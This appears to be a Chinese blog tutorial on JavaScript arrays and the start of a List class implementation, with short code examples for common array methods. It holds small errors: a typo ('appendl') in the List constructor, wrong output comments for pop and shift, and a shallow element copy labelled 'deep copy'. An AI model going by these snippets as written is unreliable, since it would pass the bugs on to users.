<p>可以调用Array.isArray()来判断一个对象是否是数组<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.isArray(numbers));<span class="comment">// 显示false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.isArray(arr));<span class="comment">// 显示true</span></span><br></pre></td></tr></table></figure></p>
<p>大多数JavaScript专家推荐使用[]操作符，和使用Array的构造函数相比，这个方式被认为效率更高。</p>
<p>读写数组</p>
<p>可以通过[]操作符将数据赋给数组<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nums = [];</span><br><span class="line">nums[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums[<span class="number">0</span>]);<span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>还可以使用[]操作符读取数组中的元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> sum = numbers[<span class="number">0</span>] + numbers[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">console</span>.log(sum);<span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>javascript中的数组也是对象，数组的长度可以任意增长，超出其创建时指定的长度。</p>
<h2 id="由字符串生成数组"><a href="#由字符串生成数组" class="headerlink" title="由字符串生成数组"></a>由字符串生成数组</h2><p>调用字符串对象的split()方法也可以生成数组。该方法通过一些常见的分隔符，比如分隔单词的空格，将一个字符串分成几部分，并将每部分作为一个元素保存于一个新建的数组中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="keyword">var</span> arr = str.split(<span class="string">" "</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// ["hello", "world"]</span></span><br></pre></td></tr></table></figure>
<h2 id="对数组的整体性操作"><a href="#对数组的整体性操作" class="headerlink" title="对数组的整体性操作"></a>对数组的整体性操作</h2><p>首先，可以将一个数组赋给另外一个数组：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// [1,2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr2);<span class="comment">// [1,2]</span></span><br></pre></td></tr></table></figure></p>
<p>当把一个数组赋给另外一个数组时，只是为被赋值的数组增加了一个新的引用。当你通过原引用修改了数组的值，另外一个引用也会感知到这个变化。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line">arr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// [0,2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr2);<span class="comment">// [0,2]</span></span><br></pre></td></tr></table></figure></p>
<p>这种行为被称为浅复制，新数组依然指向原来的数组。一个更好的方案是使用深复制，将原数组中的每一个元素都复制一份到新数组中。可以写一个深复制函数来做这件事。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">arr1, arr2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1.length; ++i) &#123;</span><br><span class="line">        arr2[i] = arr1[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h2><p>indexOf用来查找传进来的参数在目标数组中是否存在。如果目标数组包含该参数，就返回该元素在数组中的索引；如果不包含，就返回-1。如果数组中包含多个相同的元素，则总是返回第一个与参数相同的元素的索引。有另外一个功能与之类似的函数：lastIndexOf,该函数返回相同元素中最后一个元素的索引，如果没有找到相同元素，则返回-1。</p>
<h2 id="数组的字符串表示"><a href="#数组的字符串表示" class="headerlink" title="数组的字符串表示"></a>数组的字符串表示</h2><p>join和toString返回一个包含数组所有元素的字符串，各元素之间用逗号分隔开。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.toString());<span class="comment">// "1,2"</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.join());<span class="comment">// "1,2"</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.join(<span class="string">"-"</span>));<span class="comment">// "1-2"</span></span><br></pre></td></tr></table></figure>
<h2 id="由已有数组创建新数组"><a href="#由已有数组创建新数组" class="headerlink" title="由已有数组创建新数组"></a>由已有数组创建新数组</h2><p>concat的发起者是一个数组，参数是另一个数组。作为参数的数组，其中的所有元素都被连接到调用concat()方法的数组后面。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = arr1.concat(arr2);</span><br><span class="line"><span class="built_in">console</span>.log(arr3);<span class="comment">// [1,2]</span></span><br></pre></td></tr></table></figure>
<p>splice方法的第一个参数是截取的起始索引，第二个参数是截取的长度。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.splice(<span class="number">2</span>,<span class="number">2</span>));<span class="comment">// [3,4]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [1,2,5]</span></span><br></pre></td></tr></table></figure>
<h2 id="为数组添加元素"><a href="#为数组添加元素" class="headerlink" title="为数组添加元素"></a>为数组添加元素</h2><p>push方法将一个元素添加到数组末尾</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line">arr.push(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [1,2]</span></span><br></pre></td></tr></table></figure>
<p>unshift方法可以将元素添加到数组的开头</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line">arr.unshift(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br></pre></td></tr></table></figure>
<h2 id="从数组中删除元素"><a href="#从数组中删除元素" class="headerlink" title="从数组中删除元素"></a>从数组中删除元素</h2><p>pop方法可以删除数组末尾的元素</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">arr.pop();</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>shift方法可以删除数组的第一个元素</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">arr.shift();</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>pop和shift方法都将删除的元素作为方法的返回值返回。</p>
<p>从数组中间位置添加和删除元素</p>
<p>使用splice为数组添加元素</p>
<ol>
<li>起始索引（也就是你希望开始添加元素的地方）</li>
<li>需要删除的元素个数（添加元素时该参数设为0）</li>
<li>想要添加进数组的元素</li>
</ol>
<p>插入元素<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">arr1.splice(<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// [1,3,4,2]</span></span><br></pre></td></tr></table></figure></p>
<p>删除元素<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr1.splice(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1);<span class="comment">// [1,3]</span></span><br></pre></td></tr></table></figure></p>
<p>为数组排序<br>reverse,将数组中元素的顺序进行翻转。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">nums.reverse();</span><br><span class="line"><span class="built_in">console</span>.log(nums);<span class="comment">// [3, 2, 1]</span></span><br></pre></td></tr></table></figure></p>
<p>sort,将数组排序,是按照字典顺序进行排序的，即使元素是数字类型，也被认为是字符串类型。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">4</span>,<span class="number">200</span>];</span><br><span class="line">arr.sort();</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [1, 100, 2, 200, 3, 4]</span></span><br></pre></td></tr></table></figure></p>
<p>为了让sort()方法也能排序数字类型的元素，可以在调用方法时传入一个大小比较函数，排序时，sort()方法将会根据该函数比较数组中两个元素的大小，从而决定整个数组的顺序。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 - num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">4</span>,<span class="number">200</span>];</span><br><span class="line">arr.sort(compare);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [1, 2, 3, 4, 100, 200]</span></span><br></pre></td></tr></table></figure></p>
<h2 id="不生成新数组的迭代器方法"><a href="#不生成新数组的迭代器方法" class="headerlink" title="不生成新数组的迭代器方法"></a>不生成新数组的迭代器方法</h2><p>forEach方法接受一个函数作为参数，对数组中的每个元素使用该函数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
<p>every方法接受一个返回值为布尔类型的函数，对数组中的每个元素使用该函数。如果对于所有的元素，该函数均返回true,则该方法返回true。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> ret = arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(ret);<span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>some方法接受一个返回值为布尔类型的函数，只要有一个元素使得该函数返回true,该方法就返回true.<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> ret = arr.some(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(ret);<span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>reduce方法接受一个函数，返回一个值。改方法会从一个累加值开始，不断对累加值和数组中的后续元素调用该函数，直到数组中的最后一个元素，最后返回得到的累加值。下面这个例子展示了如何使用reduce方法为数组中的元素求和：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">total, value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(add);</span><br><span class="line"><span class="built_in">console</span>.log(sum);<span class="comment">// 6</span></span><br></pre></td></tr></table></figure></p>
<p>reduce也可以将数组元素连接成一个长的字符串<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concat</span>(<span class="params">total, value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(concat);</span><br><span class="line"><span class="built_in">console</span>.log(sum);<span class="comment">// 123</span></span><br></pre></td></tr></table></figure></p>
<p>reduceRight和reduce方法不同，它是从右到左执行。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concat</span>(<span class="params">total, value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total + value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduceRight(concat);</span><br><span class="line"><span class="built_in">console</span>.log(sum);<span class="comment">// 321</span></span><br></pre></td></tr></table></figure></p>
<h2 id="生成新数组的迭代器方法"><a href="#生成新数组的迭代器方法" class="headerlink" title="生成新数组的迭代器方法"></a>生成新数组的迭代器方法</h2><p>map和forEach有点像，对数组的每个元素使用某个函数。两者的区别是map返回一个新的数组，该数组的元素是对原有元素应用某个函数得到的结果。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item + <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr);<span class="comment">// [2, 3]</span></span><br></pre></td></tr></table></figure></p>
<p>filter和every类似，传入一个返回值为布尔类型的函数。该方法返回一个新数组，该数组包含应用该函数后结果为true的元素。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item % <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr);<span class="comment">// [1, 3]</span></span><br></pre></td></tr></table></figure></p>
<h2 id="二维和多维数组"><a href="#二维和多维数组" class="headerlink" title="二维和多维数组"></a>二维和多维数组</h2><p>JavaScript只支持一维数组，但是通过在数组里保存数组元素的方式，可以轻松创建多维数组。</p>
<h2 id="创建二维数组"><a href="#创建二维数组" class="headerlink" title="创建二维数组"></a>创建二维数组</h2><p>创建一个n行1列的二维数组：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">var</span> rows = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">    arr[i] = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [Array(0), Array(0)]</span></span><br></pre></td></tr></table></figure></p>
<p>还可以仅用一行代码就创建并且使用一组初始值来初始化一个二维数组：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>]];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">0</span>][<span class="number">1</span>]);<span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="处理二维数组的元素"><a href="#处理二维数组的元素" class="headerlink" title="处理二维数组的元素"></a>处理二维数组的元素</h2><p>处理二维数组中的元素，有两种最基本的方式：按列访问和按行访问。</p>
<p>对于按列访问，外层循环对应行，内层循环对应列。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>]];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr[i].length; ++j) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(arr[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
<p>按行访问，外层循环对应列，内层循环对应行。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>]];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr[i].length; ++j) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(arr[j][i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h2><p>数组还可以包含对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> points = [&#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>&#125;, &#123;<span class="attr">x</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">4</span>&#125;];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; points.length; ++ i) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Point "</span> + <span class="built_in">parseInt</span>(i+<span class="number">1</span>) + <span class="string">": "</span> + points[i].x + <span class="string">","</span> + points[i].y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Point 1: 1,2</span></span><br><span class="line"><span class="comment">// Point 2: 3,4</span></span><br></pre></td></tr></table></figure></p>
<h2 id="对象中的数组"><a href="#对象中的数组" class="headerlink" title="对象中的数组"></a>对象中的数组</h2><p>对象内部使用数组保存数据<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weekTemps</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = [];</span><br><span class="line">    <span class="keyword">this</span>.add = add;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data.push(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> thisWeek = <span class="keyword">new</span> weekTemps();</span><br><span class="line">thisWeek.add(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(thisWeek.data); <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>当不需要在一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没有那么大了。</p>
<h2 id="列表的抽象数据类型定义"><a href="#列表的抽象数据类型定义" class="headerlink" title="列表的抽象数据类型定义"></a>列表的抽象数据类型定义</h2><p>列表是一组有序的数据。每个列表中的数据项称为元素。在JavaScript中，列表中的元素可以是任意数据类型。列表中可以保存多少元素并没有事先限定，实际使用时元素的数量受到程序内存的限制。</p>
<p>不包含任何元素的列表称为空列表。列表中包含元素的个数称为列表的length.在内部实现上，用一个变量listSize保存列表中元素的个数。可以在列表末尾append一个元素，也可以在一个给定元素后或列表的起始位置insert一个元素。使用remove方法从列表中删除元素，使用clear方法清空列表中所有的元素。</p>
<p>还可以使用toString()方法显示列表中所有的元素，使用getElement()方法显示当前元素。列表拥有描述元素位置的属性。列表有前有后，使用next()方法可以从当前元素移动到下一个元素，使用prev方法可以移动到当前元素的前一个元素。还可以使用moveTo(n)方法直接移动到指定位置，这里的n表示要移动到第n个位置。currPos属性表示列表中的当前位置。</p>
<p>下表展示了列表的完整抽象数据类型定义<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/1.jpg" alt="avatar"></p>
<h2 id="实现列表类"><a href="#实现列表类" class="headerlink" title="实现列表类"></a>实现列表类</h2><p>让我们从定义构造函数开始，虽然它本身并不是列表抽象数据类型定义的一部分<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">List</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.listSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.clear = clear;</span><br><span class="line">    <span class="keyword">this</span>.find = find;</span><br><span class="line">    <span class="keyword">this</span>.toString = toString;</span><br><span class="line">    <span class="keyword">this</span>.insert = insert;</span><br><span class="line">    <span class="keyword">this</span>.append = appendl</span><br><span class="line">    <span class="keyword">this</span>.remove = remove;</span><br><span class="line">    <span class="keyword">this</span>.front = front;</span><br><span class="line">    <span class="keyword">this</span>.end = end;</span><br><span class="line">    <span class="keyword">this</span>.prev = prev;</span><br><span class="line">    <span class="keyword">this</span>.next = next;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.currPos = currPos;</span><br><span class="line">    <span class="keyword">this</span>.moveTo = moveTo;</span><br><span class="line">    <span class="keyword">this</span>.getElement = getElement;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.contains = contains;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="append-给列表添加元素"><a href="#append-给列表添加元素" class="headerlink" title="append:给列表添加元素"></a>append:给列表添加元素</h2><p>该方法给列表的下一个位置增加一个新的元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore[<span class="keyword">this</span>.listSize++] = element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="find-在列表中查找某一元素"><a href="#find-在列表中查找某一元素" class="headerlink" title="find: 在列表中查找某一元素"></a>find: 在列表中查找某一元素</h2><p>find方法通过对数组对象dataStore进行迭代，查找给定的元素。如果找到，就返回该元素在列表中的位置，否则返回-1。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[i] == element) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="remove：从列表中删除元素"><a href="#remove：从列表中删除元素" class="headerlink" title="remove：从列表中删除元素"></a>remove：从列表中删除元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> foundAt = <span class="keyword">this</span>.find(element);</span><br><span class="line">    <span class="keyword">if</span> (foundAt &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore.splice(foundAt,<span class="number">1</span>);</span><br><span class="line">        --<span class="keyword">this</span>.listSize;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="length-列表中有多少个元素"><a href="#length-列表中有多少个元素" class="headerlink" title="length: 列表中有多少个元素"></a>length: 列表中有多少个元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.listSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="toString-显示列表中的元素"><a href="#toString-显示列表中的元素" class="headerlink" title="toString: 显示列表中的元素"></a>toString: 显示列表中的元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="insert-向列表中插入一个元素"><a href="#insert-向列表中插入一个元素" class="headerlink" title="insert:向列表中插入一个元素"></a>insert:向列表中插入一个元素</h2><p>我们假设插入是指插入到列表中某个元素之后。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">element, after</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> insertPos = <span class="keyword">this</span>.find(after);</span><br><span class="line">    <span class="keyword">if</span> (insertPos &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore.splice(insertPos+<span class="number">1</span>, <span class="number">0</span>, element);</span><br><span class="line">        ++<span class="keyword">this</span>.listSize;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="clear-清空列表中所有的元素"><a href="#clear-清空列表中所有的元素" class="headerlink" title="clear:清空列表中所有的元素"></a>clear:清空列表中所有的元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">this</span>.dataStore;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.listSize = <span class="keyword">this</span>.pos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="contains-判断给定值是否在列表中"><a href="#contains-判断给定值是否在列表中" class="headerlink" title="contains: 判断给定值是否在列表中"></a>contains: 判断给定值是否在列表中</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contains</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[i] == element) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
